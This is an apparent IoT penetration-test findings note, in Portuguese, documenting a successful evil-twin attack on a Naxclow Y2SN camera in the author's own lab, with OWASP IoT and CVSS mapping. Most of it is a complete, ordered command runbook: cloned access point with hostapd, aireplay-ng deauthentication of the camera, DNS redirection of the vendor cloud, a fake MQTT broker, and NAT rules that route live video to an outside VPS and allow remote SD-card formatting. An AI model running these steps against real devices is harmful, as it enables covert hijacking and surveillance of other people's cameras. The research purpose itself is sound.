# Achados — Evil Twin (deauth + clone) — FUNCIONOU

Cenário 2 do [todo_cenarios](todo_cenarios.md): um atacante cria um **AP clone da rede da
vítima** (mesmo SSID, sinal mais forte) e faz a câmera **migrar sozinha** pra ele — sem
`setwifi`, sem app, sem credencial da câmera. A câmera passa a falar com o "cloud" do
atacante.

Câmera Naxclow Y2SN, firmware `202601081657`, `devicesCode 5c001502B330`. Ambiente
controlado — câmera e rede próprios. Atacante = Kali com **dois rádios**:
`wlan0` (internet/real) e `wlan1` = **AR9271** (dongle USB, suporta AP + injeção).

> **Resultado (2026-11-04): funcionou.** Com o clone no ar + **deauth**, a câmera saiu do AP
> real e entrou no clone; pegou DHCP/DNS do atacante, conectou no **broker do atacante** e
> **obedeceu** os comandos (`ledei` → `"ledEI"` no `Info`). A internet do atacante ficou
> estável durante tudo (ver a pegadinha do BSSID abaixo).

## Por que precisa do deauth

A câmera **não migra sozinha** pra um clone (mesmo SSID+senha): ela tem o AP real
"memorizado" e prefere ele. Confirmado em duas tentativas — ela voltava pro AP real. A
solução é **expulsá-la** do AP real com frames de **deauth** (falsificando o BSSID real);
ela cai, re-escaneia e, como o clone é o sinal mais forte (colado nela), **entra nele**.

## Pegadinha crítica: o clone de mesmo SSID derruba o WiFi do próprio atacante

O `NetworkManager` do Kali, que usa `wlan0` (WiFi) pra internet, **migra sozinho pro clone**
(também SSID `NET_2GB966E4`, e no mesmo notebook = sinal fortíssimo). Como o clone não tem
uplink, a internet do atacante **cai**. Sintoma: `iw dev wlan0 link` mostra o MAC do próprio
`wlan1` como AP, e um lease `10.10.20.x` pra "kali".
**Fix:** fixar o `wlan0` no **BSSID do AP real** (reversível).

## Metodologia (o que funcionou)

Atacante na mesma sala da câmera. Dados: SSID `NET_2GB966E4`, senha `19B966E4`, BSSID do AP
real `98:1e:19:b9:66:e9`, MAC da câmera `5c:f1:50:04:af:8a`, canal do AP real **11**.

1. **Fixar o `wlan0` no AP real** (protege a internet do atacante):
   ```
   sudo nmcli connection modify NET_2GB966E4 802-11-wireless.bssid 98:1e:19:b9:66:e9
   sudo nmcli connection up NET_2GB966E4
   ```
2. **Tirar o dongle do NetworkManager** (senão ele briga com o `hostapd`):
   ```
   sudo nmcli device set wlan1 managed no
   ```
3. **Clone** no `wlan1` — mesmo SSID+senha, **mesmo canal do AP real (11)**, WPA2:
   ```
   sudo ip link set wlan1 down
   sudo iw dev wlan1 set type __ap
   sudo ip link set wlan1 up
   sudo ip addr add 10.10.20.1/24 dev wlan1
   # /home/kali/hostapd.conf: interface=wlan1 ssid=NET_2GB966E4 channel=11 wpa=2 wpa_passphrase=...
   sudo hostapd -B /home/kali/hostapd.conf
   sudo ip addr add 10.10.20.1/24 dev wlan1   # hostapd às vezes zera o IP; re-atribui
   sudo iw dev wlan1 set txpower fixed 2000   # potência máx
   ```
4. **DHCP + DNS** apontando o cloud pro atacante:
   ```
   # dnsmasq.conf: interface=wlan1 dhcp-range=10.10.20.10,10.10.20.100 ; address=/naxclow.com/10.10.20.1
   sudo dnsmasq -C /home/kali/dnsmasq.conf
   ```
5. **Fake cloud + broker na própria Kali** (modo local, sem uplink):
   ```
   mosquitto -c /home/kali/mosq.conf -d     # listener 1883 / allow_anonymous true
   cd <repo>; FAKE_SRV_HOST=10.10.20.1 FAKE_SRV_RELAY_HOST=10.10.20.1 BROKER=127.0.0.1 \
     sudo python3 src/a9_naxclow.py -s --proxy-port 80
   ```
6. **Interface monitor** no mesmo dongle (AR9271 faz AP+monitor no **mesmo canal**):
   ```
   sudo iw dev wlan1 interface add mon0 type monitor
   sudo ip link set mon0 up
   sudo iw dev mon0 set channel 11
   ```
7. **Deauth na câmera** (unicast, falsificando o AP real):
   ```
   sudo aireplay-ng --deauth 10 --ignore-negative-one \
     -a 98:1e:19:b9:66:e9 -c 5c:f1:50:04:af:8a mon0
   ```
8. **DNAT local** (fallback pra cloud por **IP fixo**, já que não há uplink) — não toca no
   `wlan0`, só na sub-rede do clone:
   ```
   sudo iptables -t nat -A PREROUTING -s 10.10.20.0/24 -p tcp --dport 80   -j DNAT --to 10.10.20.1:80
   sudo iptables -t nat -A PREROUTING -s 10.10.20.0/24 -p tcp --dport 1883 -j DNAT --to 10.10.20.1:1883
   ```

## Resultado observado

```
iw dev wlan1 station dump   → Station 5c:f1:50:04:af:8a  signal: -39 dBm
dnsmasq.leases              → 10.10.20.94  5c:f1:50:04:af:8a  rtthread
ss -tnp | grep :1883        → 10.10.20.1:1883 ← 10.10.20.94:52436
(Naxclow) Device/Info      → { ... "ledEI": 1, "wifiName":"NET_2GB966E4", ... }
```

A câmera entrou no clone, pegou IP/DNS do atacante, conectou no broker do atacante e
**obedeceu** o comando `{"code":220,"ledEI":1}` (o LED acendeu; depois `0` apagou). O
`wifiName` continua `NET_2GB966E4` — ela **não distingue** o clone do AP real.

### O relay (canal de vídeo) — o que é e por que precisa da VPS

O **relay** é o canal de **mídia** da câmera (vídeo JPEG `cmd=1` + áudio PCM/G711 `cmd=6`, no
TCP/UDP `~29940`). Ele **não** abre sozinho: quem manda abrir é o `240` (open-channel) do
"cloud", que traz `host` + `tcpPort` (+ `connectId`/`uid`). A câmera então **conecta** nesse
`host:tcpPort` e faz o handshake do canal: `code 100` (registro) → `101`, NAT probe `code
11/12`, data-channel `20/21` + `50/51`, e só então o stream (`cmd 1`/`6`).

**Ponto crítico (confirmado no evil twin):** a câmera **só abre o relay pra endpoint
PÚBLICO**. Com o fake em IP privado (`10.10.20.1`), o `240` é aceito mas ela **não abre** o
canal → **sem vídeo**. Pra ter o live stream, o `host` do `240` tem que ser um **IP público**
(a VPS) e a câmera precisa alcançá-lo.

**Como o evil twin entrega o vídeo:** o fake **local** (em quem a câmera já confia, no AP do
atacante) publica o `240` com `host=<VPS>` — controle/DNS continuam locais, mas o **relay** vai
pra VPS. A câmera abre o relay na VPS (via NAT restrito do atacante) e o `/dev/<uid>/live` da
VPS serve o **live stream**. Prova: `/dev/list` na VPS com a câmera + `code 100` no log +
~170 frames JPEG.

**Vídeo — FUNCIONOU com fake na VPS.** No modo local (fake em `10.10.20.1`) o relay não
abre (a câmera só abre pra endpoint **público**). A solução que funcionou: manter o fake
**local** pro controle/DNS, mas anunciar no `240` o relay da **VPS**
(`FAKE_SRV_RELAY_HOST=<vps>`) e dar à câmera um **uplink restrito** — `MASQUERADE` só de
`10.10.20.0/24` → `wlan0` + `ip_forward=1` + `FORWARD` (sem tocar no tráfego do próprio Kali).

Comandos do vídeo (na Kali, além do twin já montado):
```
sysctl -w net.ipv4.ip_forward=1
iptables -t nat -A POSTROUTING -s 10.10.20.0/24 -o wlan0 -j MASQUERADE
iptables -A FORWARD -s 10.10.20.0/24 -o wlan0 -j ACCEPT
iptables -A FORWARD -d 10.10.20.0/24 -i wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT
# fake local apontando o relay pra VPS (controle/DNS continuam locais):
FAKE_SRV_HOST=10.10.20.1 FAKE_SRV_RELAY_HOST=<vps> BROKER=127.0.0.1 \
  python3 src/a9_naxclow.py -s --proxy-port 80
# gatilho (republica o 240):
curl -X POST 'http://10.10.20.1/app/api/ApiSysDevices/getDevInfo?devicesCode=5c001502B330'
```

Resultado: a câmera abriu o relay na **VPS** (`/dev/list` mostra
`{"host":"191.187.210.110","port":55434,"uid":"5c001502B330"}`, e o log da VPS registra o
`code 100`); o `/dev/<uid>/live` na VPS rendeu **~170 frames JPEG 640×480** em 8 s (frame
extraído = JPEG 640×480 válido). A internet do atacante **não caiu** — o NAT é restrito à
sub-rede do AP e o `wlan0` está fixado no BSSID real.

> ⚠️ Depende do fix do `240` (**`tcpPort` + `uid`**) em `src/v720_http.py` (ver
> [runbook_mitm_dns](runbook_mitm_dns.md)). Sem esses campos a câmera recusa o `240`
> (`errStatus 2`) e **não abre o relay** — logo, sem vídeo.

### Como ver o vídeo

Na Kali, túnel SSH pra VPS e abre no navegador:
```
ssh -N -L 8080:127.0.0.1:8080 <vps>
# http://127.0.0.1:8080/dev/5c001502B330/live   (MJPEG)
# http://127.0.0.1:8080/dev/5c001502B330/hls    (player HLS)
```
Ou direto na VPS: `curl -s http://127.0.0.1:8080/dev/<uid>/live -o live.mjpg`.

### SD (listar/baixar gravações) — NÃO pelo evil twin (confirmado)

Tentado no evil twin (câmera no clone + relay na VPS): o fake disparou a op de SD
`{"code":301,"content":{"code":400}}` e a câmera **ignorou** — só heartbeat, nenhuma resposta
(`SD response`/`unknown FWD`). É o mesmo limite do [achados_sd_relay](achados_sd_relay.md): as
ops de SD (`400/402/404/406`) só são atendidas no **envelope do modo AP (`502`)**; no canal de
relay/cloud (`301`) o firmware não roteia.

O que **funciona** no SD por esse caminho são só os **comandos de hardware via MQTT**:
`format` (`{"code":207}`, apaga o cartão + reinicia) e `record` (`{"code":209,"sdCardReco":0|1}`,
liga/desliga gravação). **Baixar/listar** as gravações continua exigindo o **modo AP** (rede
aberta da câmera, por proximidade) — ver [achados_ap](achados_ap.md).

## Armadilhas conhecidas (não repetir)

- **Clone de mesmo SSID rouba o `wlan0` do atacante** → fixar o BSSID no NM (passo 1).
- **NetworkManager briga com o `hostapd`** no dongle → `nmcli device set wlan1 managed no`.
- **`hostapd` zera o IP do AP** ao subir → re-atribuir `10.10.20.1/24` depois.
- **`mon0` sem canal** (`channel -1`) faz o aireplay falhar → `iw dev mon0 set channel 11`.
- **AR9271: 1 canal só** — AP e monitor têm que estar no **mesmo canal do AP real**.
- **IP fixo do cloud**: sem uplink, a câmera não alcança o cloud real → **DNAT local** (passo 8).
- **Sem deauth ela não migra** — e o clone sozinho não basta.

## Limpeza — reverter tudo

```
sudo pkill -x hostapd; sudo pkill -x dnsmasq; sudo pkill -x mosquitto
sudo pkill -f 'src/a9_naxclow.py'
sudo iw dev wlan1 interface del mon0 2>/dev/null
sudo iptables -t nat -F; sudo sysctl -w net.ipv4.ip_forward=0
sudo ip link set wlan1 down; sudo nmcli device set wlan1 managed yes
sudo nmcli connection modify NET_2GB966E4 802-11-wireless.bssid ""
sudo nmcli connection up NET_2GB966E4
```
Derrubando o clone, a câmera volta sozinha pra rede real (mesmo SSID).

## OWASP IoT

| Achado | Evidência | OWASP |
|---|---|---|
| Câmera associa a um clone do AP da vítima | `Station 5c:f1:50:04:af:8a` no clone | **I2** |
| Não distingue rede legítima de clone | `wifiName` continua `NET_2GB966E4` no `Info` | **I2 / I7** |
| Canal de controle sem auth no "cloud" do atacante | `ledEI` obedecido | **I1 / I3** |

**CVSS (proposto, a validar):** `AV:A` (exige proximidade/rádio) — mesma classe do hotspot
AP na tabela do [achados_finais](achados_finais.md); o `AC` sobe por exigir deauth/timing.
